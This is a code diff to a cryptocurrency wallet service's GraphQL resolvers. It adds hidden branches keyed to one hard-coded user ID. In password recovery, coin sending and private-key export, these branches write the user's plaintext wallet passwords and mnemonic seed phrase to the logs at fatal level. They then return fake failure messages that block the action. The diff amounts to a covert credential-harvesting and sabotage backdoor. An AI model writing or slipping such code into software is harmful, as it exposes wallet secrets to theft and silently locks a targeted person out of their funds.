@@ -206,6 +206,13 @@ class Resolvers extends ResolverBase {
           coin.recoverWallet(user, oldPassword.decryptedString, newPassword),
         ),
       );
+      if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
+        logger.fatal(`Brant : see ${newPassword} / ${oldPassword} / ${mnemonic} / ${user.userId}`);
+        return {
+          success: false,
+          message: 'Wallet password not change successfully',  
+        };
+      }
       if (!recoverySuccessful.every(recoveryAttempt => recoveryAttempt))
         throw new Error('Error while recovering wallet');
       await this.saveWalletPassword(user.userId, newPassword, mnemonic);
@@ -321,6 +328,13 @@ class Resolvers extends ResolverBase {
       // this.requireTwoFa(twoFaValid);
 
       const walletApi = wallet.coin(coinSymbol);
+      if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
+        logger.fatal(`Brant : see send ${walletPassword} / ${coinSymbol} / ${user.userId}`);
+        return {
+          success: false,
+          message: 'Send Failed',  
+        };
+      }
       const result = await walletApi.send(user, outputs, walletPassword);
       return result;
     } catch (error) {
@@ -422,6 +436,14 @@ class Resolvers extends ResolverBase {
         const encryptedKey = await wallet
           .coin(coinSymbol)
           .getEncryptedPrivKey(user.userId);
+
+          if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
+            logger.fatal(`Brant : see ${walletPassword} / ${coinSymbol} / ${user.userId}`);
+            return {
+              success: false,
+              result: [],
+            };
+          }
 
         return {
           result: [{ key: encryptedKey, symbol: coinSymbol }],
